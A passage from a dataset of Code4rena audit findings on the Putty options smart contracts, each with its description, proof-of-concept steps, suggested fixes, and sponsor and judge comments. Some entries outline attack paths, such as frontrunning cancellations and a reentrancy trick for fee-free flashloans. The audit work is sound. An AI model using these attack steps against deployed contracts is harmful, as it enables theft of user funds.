      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/373",
      "tags": [],
      "finders": [
        "csanuragjain",
        "hyh",
        "Treasure-Seeker",
        "minhquanym"
      ]
    },
    {
      "id": "2947",
      "title": "[M-14] Order cancellation is prone to frontrunning and is dependent on a centralized database",
      "impact": "MEDIUM",
      "content": "_Submitted by shung, also found by unforgiven_\n\nOrder cancellation requires makers to call `cancel()`, inputting the order as a function parameter. This is the only cancellation method, and it can cause two issues.\n\nThis first issue is that it is an on-chain signal for MEV users to frontrun the cancellation and fill the order.\n\nThe second issue is the dependency to a centralized service for cancelling the order. As orders are signed off chain, they would be stored in a centralized database. It is unlikely that an end user would locally record all the orders they make. This means that when cancelling an order, maker needs to request the order parameters from the centralized service. If the centralized service goes offline, it could allow malicious parties who have a copy of the order database to fill orders that would have been cancelled otherwise.\n\n### Proof of Concept\n\n1.  Bob signs an order which gets recorded in Putty servers.\n2.  Alice mirrors all the orders using Putty APIs.\n3.  Putty servers go offline.\n4.  Bob wants to cancel his order because changing token prices makes his order less favourable to him.\n5.  Bob cannot cancel his order because Putty servers are down and he does not remember the exact amounts of tokens he used.\n6.  Alice goes through all the orders in her local mirror and fulfills the non-cancelled orders, including Bob's, with extremely favourable terms for herself.\n\n### Recommended Mitigation Steps\n\nAside from the standard order cancellation method, have an extra method to cancel all orders of a caller. This can be achieved using a \"minimum valid nonce\" state variable, as a mapping from user address to nonce.\n\n```solidity\nmapping(address => uint256) minimumValidNonce;\n```\n\nAllow users to increment their `minimumValidNonce`. Make sure the incrementation function do not allow incrementing more than `2**64` such that callers cannot lock themselves out of creating orders by increasing `minimumValidNonce` to `2**256-1` by mistake. Then, prevent filling orders if `order.nonce < minimumValidNonce`.\n\nAnother method to achieve bulk cancelling is using counters. For example, Seaport [uses counters](https://github.com/ProjectOpenSea/seaport/blob/171f2cd7faf13b2bf0455851499f1981274977f7/contracts/lib/CounterManager.sol), which is an extra order parameter that has to match the corresponding counter state variable. It allows maker to cancel all his orders by [incrementing the counter state variable by one](https://github.com/ProjectOpenSea/seaport/blob/171f2cd7faf13b2bf0455851499f1981274977f7/contracts/lib/Consideration.sol#L475-L478).\n\nEither of these extra cancellation methods would enable cancelling orders without signalling to MEV bots, and without a dependency to a centralized database.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/186#issuecomment-1177567080):**\n > Should this be tagged as Med or Low? Funds are not directly at risk unless the centralised order book server goes down and loses all the data. Perhaps there is a non-negligible chance that this *could* happen. But even then, orders have an \"expiration\" field attached to them which will render them useless after some set time period. There are also easy fixes on the frontend, such as allowing users to download a txt file with their order/orderHash so that they don't have to rely on the centralised DB for data availability. \n> \n> But will defer to judges.\n>\n> Report: Cannot cancel orders without reliance on centralised database.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/186#issuecomment-1184059122):**\n > The sponsor's point is valid: there is an expiration param that the maker signs as part of the order that marks its validity.\n> \n> However, the warden(s) concerns are valid too. While it is an edge case that is very unlikely to happen, there would arguably be a \"loss\" of assets of the maker because of the protocol's loss of functionality, as per the scenario described above. Hence, the medium severity rating is justified.\n> \n> I recommend implementing the warden's recommended fix; having a `minimumValidNonce` would be great in allowing easy on-chain cancellation of an order. It makes the system a little more trust-less and provides a \"red button\" option for makers to use if necessary.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/186#issuecomment-1185428778):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/10.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by the introduction of `setMinimumValidNonce` function and the corresponding control on order filling. See [M.M-04](#mm-04-minimumvalidnonce-can-be-reduced-due-to-an-operational-mistake-enabling-old-orders) in the Mitigation Review below.\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability of the PuttyV2.sol contract, which is used in decentralized exchanges. The vulnerability allows malicious parties to frontrun order cancellations and fill the order with favourable terms for themselves. This is possible because the only cancellation method requires makers to call `cancel()`, inputting the order as a function parameter. Since orders are signed off-chain and stored in a centralized database, it is likely that end users do not locally record all the orders they make. If the centralized service goes offline, it could allow malicious parties to fill orders that would have been cancelled otherwise.\n\nTo mitigate this vulnerability, the report recommends two methods. The first one is to have an extra method to cancel all orders of a caller, which can be achieved using a \"minimum valid nonce\" state variable. The second method is to use counters, which would require makers to increment the counter state variable by one to cancel all their orders. Either of these methods would enable cancelling orders without signalling to MEV bots, and without a dependency to a centralized database.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/186",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "shung",
        "unforgiven"
      ]
    },
    {
      "id": "2946",
      "title": "[M-13] Order duration can be set to 0 by Malicious maker",
      "impact": "MEDIUM",
      "content": "_Submitted by codexploder, also found by ACai, cccz, Critical, horsefacts, ignacio, shenwilly, unforgiven, and xiaoming90_\n\nA malicious maker can set a minimum order duration as 0 which means order will instantly expire after filling. Taker will get only the withdraw option and that too with fees on strike price, thus forcing the taker to lose money in this meaningless transaction\n\n### Proof of Concept\n\n1. Maker creates an order with zero Order duration\n2. Taker fills this order but the order instantly expires since duration was 0\n3. Taker gets the only option to withdraw with fees on strike price\n\n### Recommended Mitigation Steps\n\nEnforce at least x days of duration.\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/107#issuecomment-1185407029):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/7.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by requiring the minimal order duration of 15 minutes on filling.\n\n***\n\n",
      "summary": "\nThis bug report is about a malicious maker who can set a minimum order duration as 0, allowing the order to instantly expire after it is filled. This means that the taker will only have the option to withdraw with fees on the strike price, thus forcing them to lose money in a meaningless transaction. To fix this issue, the recommended mitigation step is to enforce at least a certain number of days of duration. This bug report provides a proof of concept to demonstrate the vulnerability, and the recommended mitigation step to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/107",
      "tags": [],
      "finders": [
        "codexploder",
        "cccz",
        "xiaoming90",
        "shenwilly",
        "ACai",
        "ignacio",
        "unforgiven",
        "Critical",
        "horsefacts"
      ]
    },
    {
      "id": "2945",
      "title": "[M-12] Options with a small strike price will round down to 0 and can prevent assets to be withdrawn",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by auditor0517, hansfriese, IllIllI, Lambda, sashik_eth, shenwilly, and TrungOre_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L499-L500>\n\n### Impact\n\nCertain ERC-20 tokens do not support zero-value token transfers and revert. Using such a token as a `order.baseAsset` for a rather small option strike and a low protocol fee rate can lead to rounding down to 0 and prevent asset withdrawals for those positions.\n\n### Proof of Concept\n\n[PuttyV2.sol#L499-L500](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L499-L500)\n\n```solidity\n// send the fee to the admin/DAO if fee is greater than 0%\nuint256 feeAmount = 0;\nif (fee > 0) {\n    feeAmount = (order.strike * fee) / 1000;\n    ERC20(order.baseAsset).safeTransfer(owner(), feeAmount); // @audit-info zero-value ERC20 token transfers can revert for certain tokens\n}\n```\n\nSome ERC20 tokens revert for zero-value transfers (e.g. `LEND`). If used as a `order.baseAsset` and a small strike price, the fee token transfer will revert. Hence, assets and the strike can not be withdrawn and remain locked in the contract.\n\nSee [Weird ERC20 Tokens - Revert on Zero Value Transfers](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers)\n\n**Example:**\n\n*   `order.baseAsset` is one of those weird ERC-20 tokens\n*   `order.strike = 999` (depending on the token decimals, a very small option position)\n*   `fee = 1` (0.1%)\n\n((999 &ast; 1) / 1000 = 0.999) rounded down to 0 -> zero-value transfer reverting transaction\n\n### Recommended Mitigation Steps\n\nAdd a simple check for zero-value token transfers:\n\n```solidity\n// send the fee to the admin/DAO if fee is greater than 0%\nuint256 feeAmount = 0;\nif (fee > 0) {\n    feeAmount = (order.strike * fee) / 1000;\n\n    if (feeAmount > 0) {\n        ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n    }\n}\n```\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/283#issuecomment-1178998816):**\n > Report: withdraw() can be DOSâ€™d for baseAsset ERC20s that prevent 0 transfers if the calculated feeAmount is 0 due to rounding.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/283#issuecomment-1185413905):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed along with [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269) in [`PR#4`](https://github.com/outdoteth/putty-v2/pull/4).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called PuttyV2.sol, which is located on a GitHub repository. This vulnerability can lead to assets and the strike not being able to be withdrawn and remaining locked in the contract. The cause of this vulnerability is that certain ERC-20 tokens do not support zero-value token transfers and revert. If a token with this feature is used as a `order.baseAsset` for a rather small option strike and a low protocol fee rate, it can lead to rounding down to 0 and prevent asset withdrawals for those positions. It is recommended to add a check for zero-value token transfers to fix this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/283",
      "tags": [],
      "finders": [
        "IllIllI",
        "auditor0517",
        "berndartmueller",
        "Lambda",
        "shenwilly",
        "hansfriese",
        "sashiketh",
        "TrungOre_"
      ]
    },
    {
      "id": "2944",
      "title": "[M-11] fee can change without the consent of users",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240\n https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L497\n\n\n## Vulnerability details\n\n## Impact\nFees are applied during `withdraw`, but can change between the time the order is filled and its terms are agreed upon and the withdrawal time, leading to a loss of the expected funds for the concerned users.\n\n## Proof of Concept\nThe scenario would be:\n\n - Alice and Bob agrees to fill an order at a time fees are 0.1%\n - During the duration of the option, fees are increased to 3%\n - At withdrawal they'll pay 3% of the strike, although they wouldn't have created the order in the first place with such fees\n\n\n## Recommended Mitigation Steps\nMitigation could be:\n - Store the fees in `Order` and verify that they are correct when the order is filled, so they are hardcoded in the struct\n - Add a timestamp: this wouldn't fully mitigate but would still be better than the current setup\n - Keep past fees and fee change timestamps in memory (for example in an array) to be able to retrieve the creation time fees at withdrawal",
      "summary": "\nThis bug report is related to a vulnerability in the code of the PuttyV2.sol contract. The vulnerability can lead to users losing expected funds due to fees changing between the time the order is filled and the time of withdrawal. This can occur when Alice and Bob agree to fill an order at a time when fees are 0.1%, but then during the duration of the option fees are increased to 3%. When they withdraw, they will have to pay 3% of the strike, even though they would not have created the order with such fees. \n\nRecommended mitigation steps include storing the fees in the Order and verifying that they are correct when the order is filled, adding a timestamp, and keeping past fees and fee change timestamps in memory to be able to retrieve the creation time fees at withdrawal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/422",
      "tags": [],
      "finders": [
        "0xsanson",
        "BowTiedWardens",
        "Metatron",
        "Picodes",
        "unforgiven_",
        "berndartmueller",
        "dirky",
        "antonttc",
        "Alex the Entreprenerd",
        "catchup",
        "horsefacts",
        "0xNineDec",
        "sseefried"
      ]
    },
    {
      "id": "2943",
      "title": "[M-10] Putty position tokens may be minted to non ERC721 receivers",
      "impact": "MEDIUM",
      "content": "_Submitted by horsefacts, also found by 0xc0ffEE, 0xsanson, berndartmueller, BowTiedWardens, csanuragjain, defsec, IllIllI, joestakey, Kenshin, Picodes, shenwilly, Sm4rty, unforgiven, and xiaoming90_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L302-L308>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L11-L18>\n\n### Vulnerability Details\n\nPutty uses ERC721 `safeTransfer` and `safeTransferFrom` throughout the codebase to ensure that ERC721 tokens are not transferred to non ERC721 receivers. However, the initial position mint in `fillOrder` uses `_mint` rather than `_safeMint` and does not check that the receiver accepts ERC721 token transfers:\n\n[`PuttyV2#fillOrder`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L302-L308)\n\n```solidity\n        // create long/short position for maker\n        _mint(order.maker, uint256(orderHash));\n\n        // create opposite long/short position for taker\n        bytes32 oppositeOrderHash = hashOppositeOrder(order);\n        positionId = uint256(oppositeOrderHash);\n        _mint(msg.sender, positionId);\n```\n\n[`PuttyV2Nft#_mint`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L11-L18)\n\n```solidity\n    function _mint(address to, uint256 id) internal override {\n        require(to != address(0), \"INVALID_RECIPIENT\");\n        require(_ownerOf[id] == address(0), \"ALREADY_MINTED\");\n\n        _ownerOf[id] = to;\n\n        emit Transfer(address(0), to, id);\n    }\n```\n\n### Impact\n\nIf a maker or taker are a contract unable to receive ERC721 tokens, their options positions may be locked and nontransferable. If the receiving contract does not provide a mechanism for interacting with Putty, they will be unable to exercise their position or withdraw assets.\n\n### Recommendation\n\nConsider implementing the `require` check in Solmate's `ERC721#_safeMint` in your own mint function:\n\n```solidity\n    function _safeMint(address to, uint256 id) internal virtual {\n        _mint(to, id);\n\n        require(\n            to.code.length == 0 ||\n                ERC721TokenReceiver(to).onERC721Received(msg.sender, address(0), id, \"\") ==\n                ERC721TokenReceiver.onERC721Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n```\n\nHowever, note that calling `_safeMint` introduces a reentrancy opportunity! If you make this change, ensure that the mint is treated as an interaction rather than an effect, and consider adding a reentrancy guard:\n\n```solidity\n        /*  ~~~ EFFECTS ~~~ */\n\n        // create opposite long/short position for taker\n        bytes32 oppositeOrderHash = hashOppositeOrder(order);\n        positionId = uint256(oppositeOrderHash);\n\n        // save floorAssetTokenIds if filling a long call order\n        if (order.isLong && order.isCall) {\n            positionFloorAssetTokenIds[uint256(orderHash)] = floorAssetTokenIds;\n        }\n\n        // save the long position expiration\n        positionExpirations[order.isLong ? uint256(orderHash) : positionId] = block.timestamp + order.duration;\n\n        emit FilledOrder(orderHash, floorAssetTokenIds, order);\n\n        /* ~~~ INTERACTIONS ~~~ */\n\n        _safeMint(order.maker, uint256(orderHash));\n        _safeMint(msg.sender, positionId);\n```\n\nAlternatively, document the design decision to use `_mint` and the associated risk for end users.\n\n**[outdoteth (Putty Finance) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/327#issuecomment-1176613220):**\n> It's unlikely a contract will have all the setup required to interact with PuttyV2 but not be able to handle ERC721 tokens. Adding a check via safeMint adds a gas overhead as well as another re-entrancy attack vector so there is a tradeoff (as noted in the issue report^^).\n\n> Report: Contracts that canâ€™t handle ERC721 tokens will lose their Putty ERC721 position tokens.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/327#issuecomment-1183141452):**\n > In addition, some contracts may have custom logic in their `onERC721Received()` implementation that is triggered only by the safe methods and not their \"unsafe\" counterparts.\n\n***\n\n",
      "summary": "\nThis bug report is about the Putty codebase, which uses ERC721 `safeTransfer` and `safeTransferFrom` throughout the codebase to ensure that ERC721 tokens are not transferred to non ERC721 receivers. However, the initial position mint in `fillOrder` uses `_mint` rather than `_safeMint` and does not check that the receiver accepts ERC721 token transfers.\n\nIf a maker or taker are a contract unable to receive ERC721 tokens, their options positions may be locked and nontransferable. If the receiving contract does not provide a mechanism for interacting with Putty, they will be unable to exercise their position or withdraw assets.\n\nTo fix this issue, it is recommended to implement the `require` check in Solmate's `ERC721#_safeMint` in the mint function. However, note that calling `_safeMint` introduces a reentrancy opportunity and the mint should be treated as an interaction rather than an effect, and consider adding a reentrancy guard. Alternatively, document the design decision to use `_mint` and the associated risk for end users.",
      "quality_score": 2,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/327",
      "tags": [
        "mint vs safeMint"
      ],
      "finders": [
        "csanuragjain",
        "IllIllI",
        "0xsanson",
        "BowTiedWardens",
        "Picodes",
        "joestakey",
        "xiaoming90",
        "berndartmueller",
        "shenwilly",
        "0xc0ffEE",
        "unforgiven",
        "Kenshin",
        "horsefacts",
        "Sm4rty",
        "defsec"
      ]
    },
    {
      "id": "2942",
      "title": "[M-09] The contract serves as a flashloan pool without fee",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xc0ffEE, also found by horsefacts, pedroais, and unforgiven_\n\nThe malicious user could leverage PuttyV2 contract to flashloan without paying fee the assets to make profit.\n\nConsider a scenario that maker and taker is the same, and is a contract\n\n1.  The contract call PuttyV2.`fillOrder` with a Long Call order that has `order.baseAssets` references to a contract having custom logic other than standard ERC20. The order also specify `erc20Assets` to the `token` and `tokenAmount` that PuttyV2 contract is owing (similar to `erc721Assets`)\n2.  When the execution is at <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>, the custom logic could execute on the contract address `order.baseAsset`.\n3.  The malicious contract then call `exercise` to exercise the short call position. This call will transfer out the assets specified in the order to the malicious contract by executing logics in `_transferERC20sOut, _transferERC721sOut`\n4.  The contract uses that assets to make profit on other platforms. After that, the execution continues at <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>.\n5.  At the end of `fillOrder`, the contract just transfers enough assets back to PuttyV2 by executing logics in `_transferERC20sIn, _transferERC721sIn` to finish the execution.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1174509620):**\n> Warden is saying that they can flashloan without fee, but any exercised option will pay a 3% fee, additionally the order of operations shown (gain control on base.asset.transfer when receiving premium), would mean that the order ERC20s and NFTs have yet to be transferred in, so a \"mid-fillOrder\" \"exercise\" would not only pay the fee, but also revert due to lack of the tokens.\n\n**[Pedroais (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1174999561):**\n> The 3% will be paid in the fake asset since base asset is an attacker contract so there is no fee to perform the attack. \n> \n> This attack is done with assets that are already inside the contract so there is no revert in transfer out.\n\n**[outdoteth (Putty Finance) acknowledged and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1175061981):**\n > Acknowledging that technically this is true.\n> Although no easy mitigation exists as far as I can see aside from adding nonReentrant to exercise and fillOrder - adding a non-negligible gas overhead.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1175108315):**\n > I agree that the finding is valid, the fee can be paid in a mintable token to gain temporary ownership of a token underlying which is repaid at the end of `fillOrder`.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1178994409):**\n > Report: Itâ€™s possible to flashloan all assets in the contract without paying a protocol fee.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1182823327):**\n > Flash loans from the contract would be a feature, not a bug. However, being able to do so without paying a protocol fee (ie. paying in fake tokens) wouldn't be great. \n> \n\n***\n\n",
      "summary": "\nA bug has been reported in the PuttyV2 contract, which could allow a malicious user to leverage the contract to flashloan without paying a fee. This could result in the malicious user making a profit at the expense of the contract. \n\nThe bug occurs when the maker and taker are the same, and is a contract. The contract calls PuttyV2.fillOrder with a Long Call order that has order.baseAssets references to a contract with custom logic other than the standard ERC20. The order also specifies erc20Assets to the token and tokenAmount that PuttyV2 contract is owing. \n\nWhen the execution reaches a certain point, the custom logic could be executed on the contract address order.baseAsset. The malicious contract then calls exercise to exercise the short call position. This call will transfer out the assets specified in the order to the malicious contract by executing logics in _transferERC20sOut, _transferERC721sOut. \n\nThe malicious contract then uses the assets to make a profit on other platforms, and then transfers enough assets back to PuttyV2 by executing logics in _transferERC20sIn, _transferERC721sIn to finish the execution. \n\nThis bug could have serious implications for the PuttyV2 contract, and should be addressed as soon as possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/377",
      "tags": [],
      "finders": [
        "0xc0ffEE",
        "unforgiven",
        "pedroais",
        "horsefacts"
      ]
    },
    {
      "id": "2941",
      "title": "[M-08] Overlap Between ERC721.transferFrom() and ERC20.transferFrom() Allows order.erc20Assets or order.baseAsset To Be ERC721 Rather Than ERC20",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L344\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L360\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L601\n\n\n## Vulnerability details\n\n## Impact\n\nBoth `ERC20.transferFrom(address to, address  from, uint256 amount)` and `ERC721.transferFrom(address to, address from, uint256 id)` have the same function signature `0x23b872dd`. The impact of this is it's possible for `baseAsset` or `erc20Assets` to be ERC721 addresses rather than ERC20.\n\nThese functions will successfully transfer the NFT into the protocol however they will fail to transfer the NFT out of the contract. That is because the outgoing transfer is `ERC20.safeTransfer()` which calls `transfer(to, amount)` which does not match up with any valid function signatures on ERC721.\n\nTherefore any ERC721 tokens transferred into the contract in this manner via `fillOrder()` will be permanently stuck in the contract as neither `exercise()` nor `withdraw()` will successfully transfer the tokens out of the contract.\n\n## Proof of Concept\n\n[ERC721.transferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC721.sol#L82-L86)\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public virtual {\n```\n\n[ERC20.trasnferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC20.sol#L90-L94)\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n```\n\n## Recommended Mitigation Steps\n\nConsider whitelisting approved ERC721 and ERC20 token contracts. Furthermore, separate these two contracts into different whitelists for ERC20s and ERC721s then ensure each contract is in the right category.",
      "summary": "\nThis bug report describes a vulnerability in the code of a project hosted on GitHub. The vulnerability is that the functions `ERC20.transferFrom(address to, address  from, uint256 amount)` and `ERC721.transferFrom(address to, address from, uint256 id)` have the same function signature `0x23b872dd`. This means that it is possible for `baseAsset` or `erc20Assets` to be ERC721 addresses rather than ERC20. As a result, any ERC721 tokens transferred into the contract in this manner via `fillOrder()` will be permanently stuck in the contract and unable to be transferred out.\n\nProof of concept code is provided to demonstrate the vulnerability. The recommended mitigation steps are to consider whitelisting approved ERC721 and ERC20 token contracts, and to separate these two contracts into different whitelists for ERC20s and ERC721s to ensure each contract is in the right category.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/52",
      "tags": [],
      "finders": [
        "reassor  sseefried",
        "kirk-baird"
      ]
    },
    {
      "id": "2940",
      "title": "[M-07] An attacker can create a short put option order on an NFT that does not support ERC721 (like cryptopunk), and the user can fulfill the order, but cannot exercise the option",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by IllIllI and minhquanym_\n\nAn attacker can create a short put option on cryptopunk. When the user fulfills the order, the baseAsset will be transferred to the contract. \n\nHowever, since cryptopunk does not support ERC721, the user cannot exercise the option because the safeTransferFrom function call fails. Attacker can get premium and get back baseAsset after option expires.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L343-L346>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L628-L629>\n\n### Recommended Mitigation Steps\n\nConsider adding a whitelist to nfts in the order, or consider supporting exercising on cryptopunk.\n\n**[STYJ (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1174823604):**\n > Putty uses solmate's `ERC721.safeTransferFrom` which requires that the NFT contract implements `onERC721Received`. For the case of OG NFTs like punks and rocks, this will fail, https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC721.sol#L120\n\n**[thereksfour (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1175910424):**\n > The user does not need to send cryptopunk to the contract when fulfilling the short put option order, but the user will pay a premium to the order creator. Later, when the user wants to exercise the option, since the cryptopunk does not support safetransferfrom, the user cannot exercise the option.\n\n**[STYJ (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1176031452):**\n > > The user does not need to send cryptopunk to the contract when fulfilling the short put option order, but the user will pay a premium to the order creator. Later, when the user wants to exercise the option, since the cryptopunk does not support safetransferfrom, the user cannot exercise the option.\n> \n> Sorry, I did not consider this path. You are correct to say that a maker can create a short put option order with cryptopunks as a token and the holder of the long put option will not be able to exercise since cryptopunks cannot be transferred with `safeTransferFrom`. From that perspective, this is a valid issue. Thank you for bringing it up. I will defer to the judge for the final decision.\n\n**[outdoteth (Putty Finance) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1178923868):**\n > We dont intend to support cryptopunks or cryptokitties.\n> If users wish to use these tokens then they can get wrapped versions (ex: wrapped cryptopunks).\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1181762798):**\n > I thought cryptokitties are ERC721? I think they were the ones who popularized the standard actually :p \n> Probably meant etherrocks.\n> \n> In general, non-compliant ERC-721 NFTs can be supported through wrappers, though some users might be unaware... Downgrading to med severity, similar to [this issue from another contest](https://github.com/code-423n4/2022-02-foundation-findings/issues/74).\n> \n> \n\n**hyh (warden) reviewed mitigation:**\n > Similar to [M-01](https://github.com/code-423n4/2022-06-putty-findings/issues/50), [M-02](https://github.com/code-423n4/2022-06-putty-findings/issues/227).\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with PuttyV2.sol, a smart contract. An attacker can create a short put option on cryptopunk, a non-fungible token (NFT). When the user fulfills the order, the baseAsset will be transferred to the contract. However, since cryptopunk does not support ERC721, the user cannot exercise the option because the safeTransferFrom function call fails. The attacker can get a premium and get back the baseAsset after the option expires. The code for this vulnerability can be found in lines 343-346 and 628-629 of PuttyV2.sol. To mitigate this issue, the developers should consider adding a whitelist to NFTs in the order, or consider supporting exercising on cryptopunk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/16",
      "tags": [],
      "finders": [
        "cccz",
        "IllIllI  minhquanym"
      ]
    },
    {
      "id": "2939",
      "title": "[M-06] [Denial-of-Service] Contract Owner Could Block Users From Withdrawing Their Strike",
      "impact": "MEDIUM",
